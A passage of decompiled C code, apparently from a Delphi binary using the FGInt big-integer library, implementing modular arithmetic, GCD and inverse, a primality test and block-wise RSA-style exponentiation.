      FUN_00416b3c((int)local_24);
    }
    while (uVar6 = FUN_00415fbc((uint)param_3,(int)local_c), (char)uVar6 != '\x01') {
      while (uVar6 = FUN_00415fbc((uint)param_3,(int)local_24), (char)uVar6 != '\x01') {
        uVar6 = *local_20;
        uVar3 = **(uint **)(param_3 + 4);
        if (uVar6 < uVar3) {
          uVar4 = *(uint *)(*(int *)(param_3 + 4) + uVar3 * 4);
          uVar8 = uVar4 * -0x80000000;
          uVar5 = *(uint *)(*(int *)(param_3 + 4) + -4 + uVar3 * 4);
          local_3c = FUN_00405694(uVar5 + uVar8,(uVar4 >> 1) + (uint)CARRY4(uVar5,uVar8),uVar3,
                                  local_20[uVar6] + 1,0);
          local_38 = extraout_EDX;
        }
        else {
          local_3c = *(uint *)(*(int *)(param_3 + 4) + uVar3 * 4) / (local_20[uVar6] + 1);
          local_38 = 0;
        }
        if (local_38 == 0 && local_3c == 0) {
          FUN_004166b8((int)param_3,(int)local_24);
        }
        else {
          FUN_004164f8(local_24,(undefined *)local_2c);
          FUN_004162a4((int)local_2c,local_3c);
          FUN_004166b8((int)param_3,(int)local_2c);
          uVar6 = FUN_00415fbc((uint)param_3,(int)local_2c);
          if ((char)uVar6 != '\x01') {
            FUN_004166b8((int)param_3,(int)local_2c);
          }
          FUN_00415fa8((int)local_2c);
        }
      }
      if ((**(uint **)(param_3 + 4) < *local_20 || **(uint **)(param_3 + 4) == *local_20) &&
         (uVar6 = FUN_00415fbc((uint)local_24,(int)local_c), (char)uVar6 != '\x02')) {
        FUN_004165a0((int)local_24);
      }
    }
  }
  FUN_00415fa8((int)local_24);
  FUN_00415c1c(&DAT_004171d0,local_1c);
  FUN_00415c1c(&DAT_004171dc,local_14);
  if ((cVar1 == '\0') && (uVar6 = FUN_00415fbc((uint)param_3,(int)local_1c), (char)uVar6 != '\x02'))
  {
    FUN_0041627c(local_c,param_3,local_24);
    FUN_00415fa8((int)param_3);
    FUN_004164f8(local_24,param_3);
    FUN_00415fa8((int)local_24);
  }
  FUN_00415fa8((int)local_14);
  FUN_00415fa8((int)local_1c);
  *local_8 = cVar1;
  *local_c = cVar2;
  *in_FS_OFFSET = uStack80;
  puStack72 = &LAB_004171c1;
  puStack76 = (undefined *)0x4171b9;
  FUN_0040521c(local_2c,"\x0e\x06TFGInt\b",4);
  return;
}



void FUN_004171e0(int param_1,char *param_2,char *param_3)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  char local_c [8];
  
  puStack28 = (undefined *)0x4171fd;
  FUN_00405100((int)local_c,(int)&DAT_00415450);
  puStack32 = &LAB_00417245;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  puStack28 = &stack0xfffffffc;
  FUN_00416948(param_1,local_c);
  FUN_00416f38(local_c,param_2,param_3);
  FUN_00415fa8((int)local_c);
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_0041724c;
  puStack32 = (undefined *)0x417244;
  FUN_004051d0((int)local_c,(int)&DAT_00415450);
  return;
}



void FUN_00417254(char *param_1,char *param_2,char *param_3,char *param_4)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  char local_c [8];
  
  puStack28 = (undefined *)0x417271;
  FUN_00405100((int)local_c,(int)&DAT_00415450);
  puStack32 = &LAB_004172bc;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  puStack28 = &stack0xfffffffc;
  FUN_00416028(param_1,param_2,local_c);
  FUN_00416f38(local_c,param_3,param_4);
  FUN_00415fa8((int)local_c);
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_004172c3;
  puStack32 = (undefined *)0x4172bb;
  FUN_004051d0((int)local_c,(int)&DAT_00415450);
  return;
}



void FUN_004172cc(char *param_1,char *param_2,char *param_3,char *param_4)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  char local_c [8];
  
  puStack28 = (undefined *)0x4172e9;
  FUN_00405100((int)local_c,(int)&DAT_00415450);
  puStack32 = &LAB_00417334;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  puStack28 = &stack0xfffffffc;
  FUN_00416798(param_1,param_2,local_c);
  FUN_00416f38(local_c,param_3,param_4);
  FUN_00415fa8((int)local_c);
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_0041733b;
  puStack32 = (undefined *)0x417333;
  FUN_004051d0((int)local_c,(int)&DAT_00415450);
  return;
}



void FUN_00417344(undefined *param_1,undefined *param_2,uint param_3,uint param_4)

{
  uint *puVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  
  if (**(uint **)(param_1 + 4) < param_3) {
    FUN_004164f8(param_1,param_2);
  }
  else {
    FUN_00405948((int **)(param_2 + 4),(int)&DAT_00415430,1);
    iVar2 = param_3 + 1;
    iVar3 = 0;
    do {
      *(undefined4 *)(*(int *)(param_2 + 4) + iVar3 * 4) =
           *(undefined4 *)(*(int *)(param_1 + 4) + iVar3 * 4);
      iVar3 = iVar3 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    puVar1 = (uint *)(*(int *)(param_2 + 4) + param_3 * 4);
    *puVar1 = *puVar1 & param_4;
    for (uVar4 = param_3; (*(int *)(*(int *)(param_2 + 4) + uVar4 * 4) == 0 && (1 < uVar4));
        uVar4 = uVar4 - 1) {
    }
    if (uVar4 < param_3) {
      FUN_00405948((int **)(param_2 + 4),(int)&DAT_00415430,1);
    }
    **(uint **)(param_2 + 4) = uVar4;
    *param_2 = 1;
  }
  return;
}



void FUN_004173ec(char *param_1,char *param_2,undefined *param_3,uint param_4,uint param_5)

{
  uint *puVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint uVar8;
  int extraout_EDX;
  int iVar9;
  uint local_2c;
  uint local_28;
  uint local_18;
  uint local_10;
  
  iVar2 = **(int **)(param_1 + 4);
  iVar4 = **(int **)(param_2 + 4);
  local_10 = FUN_004153b4((char)(iVar2 + iVar4),0,(char)param_3,iVar2 + iVar4,0,param_5,0);
  FUN_00405948((int **)(param_3 + 4),(int)&DAT_00415430,1);
  if (local_10 != 0) {
    iVar9 = 1;
    local_28 = local_10;
    do {
      *(undefined4 *)(*(int *)(param_3 + 4) + iVar9 * 4) = 0;
      iVar9 = iVar9 + 1;
      local_28 = local_28 - 1;
    } while (local_28 != 0);
  }
  if (iVar4 != 0) {
    iVar9 = 1;
    uVar8 = extraout_ECX;
    local_28 = iVar4;
    do {
      local_18 = 0;
      iVar4 = (param_5 - iVar9) + 1;
      local_2c = FUN_004153b4((char)iVar4,0,(char)uVar8,iVar4,0,iVar2,0);
      uVar8 = extraout_ECX_00;
      if (local_2c != 0) {
        iVar4 = 1;
        do {
          uVar5 = FUN_00405670(*(int *)(*(int *)(param_1 + 4) + iVar4 * 4),0,uVar8,
                               *(int *)(*(int *)(param_2 + 4) + iVar9 * 4));
          uVar8 = iVar9 + iVar4;
          uVar3 = *(uint *)(*(int *)(param_3 + 4) + -4 + uVar8 * 4);
          uVar6 = uVar3 + uVar5;
          uVar7 = local_18 + uVar6;
          *(uint *)(*(int *)(param_3 + 4) + -4 + uVar8 * 4) = uVar7 & 0x7fffffff;
          local_18 = uVar7 >> 0x1f |
                     (extraout_EDX + (uint)CARRY4(uVar3,uVar5) + (uint)CARRY4(local_18,uVar6)) * 2;
          iVar4 = iVar4 + 1;
          local_2c = local_2c - 1;
        } while (local_2c != 0);
      }
      if ((uint)(iVar2 + iVar9) <= param_5) {
        *(uint *)(*(int *)(param_3 + 4) + (iVar2 + iVar9) * 4) = local_18;
        uVar8 = local_18;
      }
      iVar9 = iVar9 + 1;
      local_28 = local_28 + -1;
    } while (local_28 != 0);
  }
  **(uint **)(param_3 + 4) = local_10;
  if (local_10 == param_5) {
    puVar1 = (uint *)(*(int *)(param_3 + 4) + param_5 * 4);
    *puVar1 = *puVar1 & param_4;
  }
  for (; (*(int *)(*(int *)(param_3 + 4) + local_10 * 4) == 0 && (1 < local_10));
      local_10 = local_10 - 1) {
  }
  if (local_10 < **(uint **)(param_3 + 4)) {
    FUN_00405948((int **)(param_3 + 4),(int)&DAT_00415430,1);
    **(uint **)(param_3 + 4) = local_10;
  }
  if (*param_1 == *param_2) {
    *param_3 = 1;
  }
  else {
    *param_3 = 0;
  }
  return;
}



void FUN_004175b4(char *param_1,char *param_2,char *param_3,uint param_4,uint param_5,
                 undefined *param_6)

{
  uint uVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack68;
  undefined *puStack64;
  undefined *puStack60;
  uint local_2c;
  int *local_28 [2];
  char local_20 [4];
  int *local_1c;
  char local_18 [8];
  char *local_10;
  char *local_c;
  char *local_8;
  
  puStack60 = (undefined *)0x4175dd;
  local_10 = param_3;
  local_c = param_2;
  local_8 = param_1;
  FUN_00405100((int)local_18,(int)&DAT_00415450);
  puStack60 = (undefined *)0x4175eb;
  FUN_00405100((int)local_20,(int)&DAT_00415450);
  puStack60 = (undefined *)0x4175f9;
  FUN_00405100((int)local_28,(int)&DAT_00415450);
  puStack64 = &LAB_004176ef;
  uStack68 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack68;
  puStack60 = &stack0xfffffffc;
  FUN_00417344(local_8,local_20,param_5,param_4);
  FUN_004173ec(local_20,local_10,local_18,param_4,param_5);
  FUN_00416798(local_18,local_c,(undefined *)local_28);
  FUN_00415fa8((int)local_20);
  FUN_00416028((char *)local_28,local_8,local_20);
  FUN_00415fa8((int)local_28);
  FUN_00405954((int)local_1c,(int)&DAT_00415430,param_5 - 1,(int *)(param_6 + 4),
               (*local_1c - param_5) + 2);
  *param_6 = 1;
  **(int **)(param_6 + 4) = (*local_1c - param_5) + 1;
  FUN_00415fa8((int)local_20);
  if (param_4 >> 0x1e == 0) {
    FUN_0041638c((int)param_6,param_4 + 1,&local_2c);
  }
  else {
    FUN_004165a0((int)param_6);
  }
  uVar1 = FUN_00415fbc((uint)param_6,(int)local_c);
  if ((char)uVar1 != '\x01') {
    FUN_004166b8((int)param_6,(int)local_c);
  }
  FUN_00415fa8((int)local_20);
  FUN_00415fa8((int)local_18);
  *in_FS_OFFSET = uStack68;
  puStack60 = &LAB_004176f6;
  puStack64 = (undefined *)0x4176ee;
  FUN_0040521c(local_28,"\x0e\x06TFGInt\b",3);
  return;
}



void FUN_00417700(char *param_1,int param_2,char *param_3,char *param_4)

{
  uint uVar1;
  int iVar2;
  uint *in_FS_OFFSET;
  uint in_stack_ffffff98;
  char *local_40;
  uint local_3c;
  uint local_38;
  uint local_34;
  int *local_30 [2];
  char local_28 [4];
  uint *local_24;
  char local_20 [8];
  char local_18 [8];
  char local_10 [8];
  char *local_8;
  
  local_40 = (char *)0x0;
  local_8 = param_1;
  FUN_00405100((int)local_10,(int)&DAT_00415450);
  FUN_00405100((int)local_18,(int)&DAT_00415450);
  FUN_00405100((int)local_20,(int)&DAT_00415450);
  FUN_00405100((int)local_28,(int)&DAT_00415450);
  FUN_00405100((int)local_30,(int)&DAT_00415450);
  *in_FS_OFFSET = (uint)&stack0xffffffa8;
  FUN_0041595c("0",(undefined *)local_30);
  FUN_00416f38(local_8,param_3,param_4);
  uVar1 = FUN_00415fbc((uint)param_4,(int)local_30);
  if ((char)uVar1 == '\x02') {
    FUN_00415fa8((int)local_30);
  }
  else {
    FUN_00415fa8((int)param_4);
    FUN_00415fa8((int)local_30);
    FUN_004158a8(param_2,&local_40);
    local_38 = **(uint **)(param_3 + 4);
    local_34 = local_38;
    if (*(uint *)(*(int *)(param_3 + 4) + local_38 * 4) >> 0x1e == 1) {
      local_34 = local_38 + 1;
    }
    FUN_00405948((int **)&local_24,(int)&DAT_00415430,1);
    *local_24 = local_34;
    local_28[0] = '\x01';
    if (local_34 != 0) {
      iVar2 = 1;
      uVar1 = local_34;
      do {
        local_24[iVar2] = 0;
        iVar2 = iVar2 + 1;
        uVar1 = uVar1 - 1;
      } while (uVar1 != 0);
    }
    if (**(uint **)(param_3 + 4) == local_34) {
      local_3c = 0x7fffffff;
      iVar2 = 0x1d;
      do {
        local_3c = local_3c >> 1;
        if (*(uint *)(*(int *)(param_3 + 4) + local_34 * 4) >> ((byte)iVar2 & 0x1f) == 1) {
          local_24[local_34] = 1 << ((byte)iVar2 + 1 & 0x1f);
          break;
        }
        iVar2 = iVar2 + -1;
      } while (iVar2 != -1);
    }
    else {
      local_24[local_34] = 1;
      local_3c = 0x7fffffff;
    }
    FUN_00417e0c(param_3,local_28,local_10);
    if (local_10[0] == '\0') {
      FUN_004164f8(local_10,local_20);
    }
    else {
      FUN_004164f8(local_28,local_20);
      FUN_004166b8((int)local_20,(int)local_10);
    }
    FUN_004164f4(local_20);
    FUN_00415fa8((int)local_10);
    FUN_00416f38(local_28,param_3,param_4);
    FUN_004172cc(local_8,param_4,param_3,local_10);
    FUN_00415fa8((int)local_28);
    for (iVar2 = FUN_00404a68((int)local_40); iVar2 != 0; iVar2 = iVar2 + -1) {
      if (local_40[iVar2 + -1] == '1') {
        FUN_00416798(param_4,local_10,local_18);
        FUN_00415fa8((int)param_4);
        FUN_004175b4(local_18,param_3,local_20,local_3c,local_38,param_4);
        FUN_00415fa8((int)local_18);
      }
      FUN_00416948((int)local_10,local_18);
      FUN_00415fa8((int)local_10);
      FUN_004175b4(local_18,param_3,local_20,local_3c,local_38,local_10);
      FUN_00415fa8((int)local_18);
    }
    FUN_00415fa8((int)local_10);
    in_stack_ffffff98 = local_3c;
    FUN_004175b4(param_4,param_3,local_20,local_3c,local_38,local_18);
    FUN_004164f8(local_18,param_4);
    FUN_00415fa8((int)local_18);
    FUN_00415fa8((int)local_20);
  }
  *in_FS_OFFSET = in_stack_ffffff98;
  FUN_004047a8((int *)&local_40);
  FUN_0040521c(local_30,"\x0e\x06TFGInt\b",5);
  return;
}



void FUN_004179e4(undefined *param_1,undefined *param_2,undefined *param_3)

{
  uint uVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack60;
  undefined *puStack56;
  undefined *puStack52;
  int *local_28 [2];
  char local_20 [4];
  int *local_1c;
  char local_18 [8];
  undefined local_10 [8];
  undefined *local_8;
  
  puStack52 = (undefined *)0x417a01;
  local_8 = param_3;
  FUN_00405100((int)local_10,(int)&DAT_00415450);
  puStack52 = (undefined *)0x417a0f;
  FUN_00405100((int)local_18,(int)&DAT_00415450);
  puStack52 = (undefined *)0x417a1d;
  FUN_00405100((int)local_20,(int)&DAT_00415450);
  puStack52 = (undefined *)0x417a2b;
  FUN_00405100((int)local_28,(int)&DAT_00415450);
  puStack56 = &LAB_00417b03;
  uStack60 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack60;
  puStack52 = &stack0xfffffffc;
  uVar1 = FUN_00415fbc((uint)param_1,(int)param_2);
  if ((char)uVar1 == '\x02') {
    FUN_004164f8(param_1,local_8);
  }
  else if ((char)uVar1 == '\x01') {
    FUN_004179e4(param_2,param_1,local_8);
  }
  else {
    FUN_00415c1c(&DAT_00417b18,local_10);
    FUN_004164f8(param_1,local_18);
    FUN_004164f8(param_2,local_20);
    while ((*local_1c != 1 || (local_1c[1] != 0))) {
      FUN_00416f38(local_18,local_20,(char *)local_28);
      FUN_004164f8(local_20,local_18);
      FUN_004164f8((undefined *)local_28,local_20);
      FUN_00415fa8((int)local_28);
    }
    FUN_004164f8(local_18,local_8);
    FUN_00415fa8((int)local_20);
    FUN_00415fa8((int)local_10);
  }
  *in_FS_OFFSET = uStack60;
  puStack52 = &LAB_00417b0a;
  puStack56 = (undefined *)0x417b02;
  FUN_0040521c(local_28,"\x0e\x06TFGInt\b",4);
  return;
}



void FUN_00417b1c(char *param_1,char *param_2,uint param_3)

{
  int iVar1;
  uint local_10;
  
  if ((*(uint *)(*(int *)(param_1 + 4) + 4) & 1) == 0) {
    *param_2 = '\0';
  }
  else {
    iVar1 = 0;
    *param_2 = '\x01';
    local_10 = param_3;
    while ((*param_2 != '\0' && (iVar1 < 0x4cc))) {
      iVar1 = iVar1 + 1;
      FUN_00416468(param_1,*(uint *)(iVar1 * 4 + 0x43f400),&local_10);
      if (local_10 == 0) {
        *param_2 = '\0';
      }
    }
  }
  return;
}



void FUN_00417b6c(char *param_1,uint param_2,char *param_3)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  char **in_FS_OFFSET;
  bool bVar5;
  char *pcVar6;
  byte *local_60;
  byte local_59;
  int *local_58 [2];
  undefined local_50 [8];
  char local_48 [8];
  undefined local_40 [8];
  char local_38 [8];
  char local_30 [8];
  char local_28 [4];
  int local_24;
  char local_20 [8];
  undefined local_18 [8];
  uint local_10;
  uint local_c;
  char *local_8;
  
  local_60 = (byte *)0x0;
  local_c = param_2;
  local_8 = param_1;
  FUN_00405100((int)local_18,(int)&DAT_00415450);
  FUN_00405100((int)local_20,(int)&DAT_00415450);
  FUN_00405100((int)local_28,(int)&DAT_00415450);
  FUN_00405100((int)local_30,(int)&DAT_00415450);
  FUN_00405100((int)local_38,(int)&DAT_00415450);
  FUN_00405100((int)local_40,(int)&DAT_00415450);
  FUN_00405100((int)local_48,(int)&DAT_00415450);
  FUN_00405100((int)local_50,(int)&DAT_00415450);
  FUN_00405100((int)local_58,(int)&DAT_00415450);
  pcVar6 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffff88;
  FUN_004029e8();
  uVar3 = 0;
  FUN_00415c1c(&DAT_00417df0,local_40);
  FUN_00415c1c(&DAT_00417dfc,local_48);
  FUN_00415c1c(&DAT_00417e08,local_50);
  FUN_0041627c(local_8,local_48,local_28);
  FUN_0041627c(local_8,local_48,(char *)local_58);
  uVar4 = 0;
  while ((*(uint *)(local_24 + 4) & 1) == 0) {
    uVar4 = uVar4 + 1;
    FUN_00416530((int)local_28);
  }
  FUN_00405434((int)local_18,(int)local_28,(int)&DAT_00415450);
  local_10 = 0;
  *param_3 = '\x01';
  FUN_004029e8();
  while ((local_10 < local_c && (*param_3 != '\0'))) {
    local_10 = local_10 + 1;
    iVar1 = FUN_004030c0(0x4cb);
    FUN_0040803c((&DAT_0043f404)[iVar1],(int *)&local_60);
    FUN_00415c1c(local_60,local_30);
    pcVar6 = local_20;
    FUN_00417700(local_30,(int)local_18,local_8,pcVar6);
    FUN_00415fa8((int)local_30);
    uVar2 = FUN_00415fbc((uint)local_20,(int)local_48);
    local_59 = (char)uVar2 == '\x02';
    uVar2 = FUN_00415fbc((uint)local_20,(int)local_58);
    bVar5 = (char)uVar2 == '\x02';
    if ((local_59 | bVar5) == 0) {
      while ((*param_3 != '\0' && (uVar3 < uVar4))) {
        if ((uVar3 != 0 & local_59) == 0) {
          uVar3 = uVar3 + 1;
          if ((uVar4 <= uVar3) || (bVar5)) {
            if ((!bVar5) && (uVar4 <= uVar3)) {
              *param_3 = '\0';
            }
          }
          else {
            FUN_004171e0((int)local_20,local_8,local_38);
            FUN_004164f8(local_38,local_20);
            uVar2 = FUN_00415fbc((uint)local_20,(int)local_48);
            local_59 = (char)uVar2 == '\x02';
            uVar2 = FUN_00415fbc((uint)local_20,(int)local_58);
            bVar5 = (char)uVar2 == '\x02';
            if (bVar5) {
              uVar3 = uVar4;
            }
          }
        }
        else {
          *param_3 = '\0';
        }
      }
    }
  }
  FUN_00415fa8((int)local_40);
  FUN_00415fa8((int)local_48);
  FUN_00415fa8((int)local_50);
  FUN_00415fa8((int)local_18);
  FUN_00415fa8((int)local_20);
  FUN_00415fa8((int)local_58);
  *in_FS_OFFSET = pcVar6;
  FUN_004047a8((int *)&local_60);
  FUN_0040521c(local_58,"\x0e\x06TFGInt\b",9);
  return;
}



void FUN_00417e0c(undefined *param_1,char *param_2,char *param_3)

{
  uint uVar1;
  char **in_FS_OFFSET;
  char *pcVar2;
  int *local_54 [2];
  char local_4c [8];
  char local_44 [8];
  undefined local_3c [8];
  char local_34 [8];
  char local_2c [8];
  char local_24 [8];
  char local_1c [8];
  undefined local_14 [8];
  undefined local_c [8];
  
  FUN_00405100((int)local_c,(int)&DAT_00415450);
  FUN_00405100((int)local_14,(int)&DAT_00415450);
  FUN_00405100((int)local_1c,(int)&DAT_00415450);
  FUN_00405100((int)local_24,(int)&DAT_00415450);
  FUN_00405100((int)local_2c,(int)&DAT_00415450);
  FUN_00405100((int)local_34,(int)&DAT_00415450);
  FUN_00405100((int)local_3c,(int)&DAT_00415450);
  FUN_00405100((int)local_44,(int)&DAT_00415450);
  FUN_00405100((int)local_4c,(int)&DAT_00415450);
  FUN_00405100((int)local_54,(int)&DAT_00415450);
  pcVar2 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffff94;
  FUN_00415c1c(&DAT_00418020,local_14);
  FUN_004179e4(param_1,param_2,local_3c);
  uVar1 = FUN_00415fbc((uint)local_14,(int)local_3c);
  if ((char)uVar1 == '\x02') {
    FUN_004164f8(param_2,local_1c);
    FUN_004164f8(param_1,local_24);
    FUN_00415c1c(&DAT_0041802c,local_c);
    FUN_00415c1c(&DAT_0041802c,param_3);
    FUN_00415c1c(&DAT_00418020,local_34);
    do {
      FUN_00415fa8((int)local_2c);
      pcVar2 = local_2c;
      FUN_00416b98(local_1c,local_24,local_44,pcVar2);
      FUN_004164f8(local_24,local_1c);
      FUN_004164f8(local_2c,local_24);
      FUN_00416798(local_34,local_44,local_4c);
      FUN_0041627c(param_3,local_4c,(char *)local_54);
      FUN_00415fa8((int)param_3);
      FUN_00415fa8((int)local_4c);
      FUN_004164f8(local_34,param_3);
      FUN_004164f8((undefined *)local_54,local_34);
      FUN_00415fa8((int)local_44);
      uVar1 = FUN_00415fbc((uint)local_2c,(int)local_c);
    } while ((char)uVar1 != '\x02');
    if (*param_3 == '\0') {
      FUN_00416028(param_2,param_3,local_44);
      FUN_004164f8(local_44,param_3);
    }
    FUN_00415fa8((int)local_34);
    FUN_00415fa8((int)local_1c);
    FUN_00415fa8((int)local_24);
  }
  FUN_00415fa8((int)local_3c);
  FUN_00415fa8((int)local_14);
  *in_FS_OFFSET = pcVar2;
  FUN_0040521c(local_54,"\x0e\x06TFGInt\b",10);
  return;
}



void FUN_00418030(char *param_1,uint param_2,char *param_3)

{
  FUN_00417b1c(param_1,param_3,(uint)param_3);
  if (*param_3 != '\0') {
    FUN_00417b6c(param_1,param_2,param_3);
  }
  return;
}



void FUN_00418090(int param_1,int param_2,char *param_3,int *param_4)

{
  int iVar1;
  int iVar2;
  int iVar3;
  char **in_FS_OFFSET;
  undefined uVar4;
  char *pcVar5;
  uint *local_34;
  uint *local_30;
  undefined4 *local_2c;
  undefined4 *local_28;
  int *local_24 [2];
  char local_1c [8];
  char local_14 [8];
  int local_c;
  int local_8;
  
  local_34 = (uint *)0x0;
  local_28 = (undefined4 *)0x0;
  local_2c = (undefined4 *)0x0;
  local_30 = (uint *)0x0;
  local_c = param_2;
  local_8 = param_1;
  FUN_00404c58(param_1);
  FUN_00405100((int)local_14,(int)&DAT_00415450);
  FUN_00405100((int)local_1c,(int)&DAT_00415450);
  FUN_00405100((int)local_24,(int)&DAT_00415450);
  pcVar5 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffb4;
  FUN_0041595c("0",(undefined *)local_24);
  FUN_004158a8((int)param_3,(char **)&local_28);
  iVar1 = FUN_00404a68((int)local_28);
  FUN_00415700(local_8,(int *)&local_28);
  FUN_00404ab4((int *)&local_28,(undefined4 *)&DAT_004182fc,local_28);
  while (iVar2 = FUN_00404a68((int)local_28), iVar2 % (iVar1 + -1) != 0) {
    FUN_00404ab4((int *)&local_28,(undefined4 *)&DAT_004182f0,local_28);
  }
  iVar2 = FUN_00404a68((int)local_28);
  iVar2 = iVar2 / (iVar1 + -1);
  FUN_004047a8((int *)&local_2c);
  if (0 < iVar2) {
    do {
      uVar4 = iVar1 - 1U == 0;
      FUN_00404cc8((int)local_28,1,iVar1 - 1U,(int *)&local_30);
      while( true ) {
        FUN_00404cc8((int)local_30,1,1,(int *)&local_34);
        FUN_00404bb4(local_34,(uint *)&DAT_004182f0);
        if (!(bool)uVar4) break;
        iVar3 = FUN_00404a68((int)local_30);
        uVar4 = iVar3 == 1;
        if (iVar3 < 2) break;
        FUN_00404d08((int *)&local_30,1,1);
      }
      FUN_0041595c((char *)local_30,local_14);
      uVar4 = iVar1 + -1 == 0;
      FUN_00404d08((int *)&local_28,1,iVar1 + -1);
      FUN_00404bb4(local_30,(uint *)&DAT_004182f0);
      if ((bool)uVar4) {
        FUN_004164f8((undefined *)local_24,local_1c);
      }
      else {
        pcVar5 = local_1c;
        FUN_00417700(local_14,local_c,param_3,pcVar5);
      }
      FUN_00415fa8((int)local_14);
      FUN_004047a8((int *)&local_30);
      FUN_004158a8((int)local_1c,(char **)&local_30);
      while (iVar3 = FUN_00404a68((int)local_30), iVar3 % iVar1 != 0) {
        FUN_00404ab4((int *)&local_30,(undefined4 *)&DAT_004182f0,local_30);
      }
      FUN_00404a70((int *)&local_2c,local_30);
      FUN_00415fa8((int)local_1c);
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
  }
  while ((*(char *)local_2c == '0' && (iVar1 = FUN_00404a68((int)local_2c), 1 < iVar1))) {
    FUN_00404d08((int *)&local_2c,1,1);
  }
  FUN_004157ac(local_2c,param_4);
  FUN_00415fa8((int)local_24);
  *in_FS_OFFSET = pcVar5;
  FUN_004047cc((int *)&local_34,4);
  FUN_0040521c(local_24,"\x0e\x06TFGInt\b",3);
  FUN_004047a8(&local_8);
  return;
}



void FUN_00418300(int param_1,int param_2,char *param_3,int *param_4,char *param_5,char *param_6,
                 int param_7,int param_8)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  char **in_FS_OFFSET;
  undefined uVar4;
  char *pcVar5;
  uint *local_64;
  uint *local_60;
  uint *local_5c;
  uint *local_58;
  undefined4 *local_54;
  undefined4 *local_50;
  int *local_4c [2];
  char local_44 [8];
  char local_3c [8];
  undefined local_34 [8];
  char local_2c [8];
  char local_24 [8];
  char local_1c [8];
  char local_14 [8];
  char *local_c;
  int local_8;
  
  local_64 = (uint *)0x0;
  local_60 = (uint *)0x0;
  local_5c = (uint *)0x0;
  local_50 = (undefined4 *)0x0;
  local_54 = (undefined4 *)0x0;
  local_58 = (uint *)0x0;
  local_c = param_3;
  local_8 = param_1;
  FUN_00404c58(param_1);
  FUN_00405100((int)local_14,(int)&DAT_00415450);
  FUN_00405100((int)local_1c,(int)&DAT_00415450);
  FUN_00405100((int)local_24,(int)&DAT_00415450);
  FUN_00405100((int)local_2c,(int)&DAT_00415450);
  FUN_00405100((int)local_34,(int)&DAT_00415450);
  FUN_00405100((int)local_3c,(int)&DAT_00415450);
  FUN_00405100((int)local_44,(int)&DAT_00415450);
  FUN_00405100((int)local_4c,(int)&DAT_00415450);
  uVar4 = 1;
  pcVar5 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffff84;
  FUN_0041595c("0",(undefined *)local_4c);
  FUN_004158a8((int)local_c,(char **)&local_50);
  uVar1 = FUN_00404a68((int)local_50);
  FUN_00415700(local_8,(int *)&local_50);
  while( true ) {
    FUN_00404cc8((int)local_50,1,1,(int *)&local_5c);
    FUN_00404bb4(local_5c,(uint *)&DAT_004186e8);
    if (!(bool)uVar4) break;
    FUN_00404d08((int *)&local_50,1,1);
  }
  while (iVar2 = FUN_00404a68((int)local_50), iVar2 % (int)uVar1 != 0) {
    FUN_00404ab4((int *)&local_50,(undefined4 *)&DAT_004186e8,local_50);
  }
  if (*(int *)(param_2 + 4) == 0) {
    FUN_00417e0c(param_5,param_6,local_24);
    FUN_00416798(param_5,local_24,local_44);
    FUN_00415fa8((int)local_24);
    FUN_00417e0c(param_6,param_5,local_24);
    FUN_00416798(param_6,local_24,local_3c);
    FUN_00415fa8((int)local_24);
  }
  iVar2 = FUN_00404a68((int)local_50);
  iVar2 = iVar2 / (int)uVar1;
  FUN_004047a8((int *)&local_54);
  uVar4 = iVar2 == 0;
  if (0 < iVar2) {
    do {
      FUN_00404cc8((int)local_50,1,uVar1,(int *)&local_58);
      while( true ) {
        FUN_00404cc8((int)local_58,1,1,(int *)&local_60);
        FUN_00404bb4(local_60,(uint *)&DAT_004186e8);
        if (!(bool)uVar4) break;
        iVar3 = FUN_00404a68((int)local_58);
        uVar4 = iVar3 == 1;
        if (iVar3 < 2) break;
        FUN_00404d08((int *)&local_58,1,1);
      }
      FUN_0041595c((char *)local_58,local_14);
      FUN_00404d08((int *)&local_50,1,uVar1);
      FUN_00404bb4(local_58,(uint *)&DAT_004186e8);
      if ((bool)uVar4) {
        FUN_004164f8((undefined *)local_4c,local_1c);
      }
      else if (*(int *)(param_2 + 4) == 0) {
        FUN_00417700(local_14,param_8,param_6,local_24);
        FUN_00416798(local_24,local_44,local_34);
        FUN_004164f8(local_34,local_24);
        FUN_00417700(local_14,param_7,param_5,local_2c);
        FUN_00416798(local_2c,local_3c,local_34);
        FUN_004164f8(local_34,local_2c);
        pcVar5 = local_1c;
        FUN_00417254(local_24,local_2c,local_c,pcVar5);
        FUN_00415fa8((int)local_24);
        FUN_00415fa8((int)local_2c);
      }
      else {
        pcVar5 = local_1c;
        FUN_00417700(local_14,param_2,local_c,pcVar5);
      }
      FUN_00415fa8((int)local_14);
      FUN_004047a8((int *)&local_58);
      FUN_004158a8((int)local_1c,(char **)&local_58);
      while (iVar3 = FUN_00404a68((int)local_58), iVar3 % (int)(uVar1 - 1) != 0) {
        FUN_00404ab4((int *)&local_58,(undefined4 *)&DAT_004186e8,local_58);
      }
      FUN_00404a70((int *)&local_54,local_58);
